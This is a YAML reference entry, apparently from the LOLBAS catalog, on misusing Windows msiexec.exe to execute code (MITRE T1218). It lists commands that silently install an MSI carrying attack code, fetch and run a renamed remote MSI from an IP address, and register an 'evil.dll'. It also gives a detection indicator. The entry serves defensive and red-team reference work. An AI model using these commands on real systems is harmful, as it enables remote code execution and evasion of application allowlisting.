---
name: Msiexec.exe
description: Used by Windows to execute msi files
functions:
  execute:
    - description: Installs the target .MSI file silently.
      code: msiexec /quiet /i cmd.msi
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute custom made msi file with attack code
    - description: Installs the target remote & renamed .MSI file silently.
      code: msiexec /q /i http://192.168.100.3/tmp/cmd.png
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute custom made msi file with attack code from remote server
    - description: Calls DLLRegisterServer to register the target DLL.
      code: msiexec /y "C:\folder\evil.dll"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute dll files
    - description: Calls DLLRegisterServer to un-register the target DLL.
      code: msiexec /z "C:\folder\evil.dll"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute dll files
resources:
    - resource: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
    - resource: https://twitter.com/PhilipTsukerman/status/992021361106268161
fullpath:
    - path: C:\Windows\System32\msiexec.exe
    - path: C:\Windows\SysWOW64\msiexec.exe
detection:
  - IOC: msiexec.exe getting files from Internet
acknowledgement:
  - Person: netbiosX
    Handle: '@netbiosX'
  - Person: Philip Tsukerman
    Handle: '@PhilipTsukerman'
---
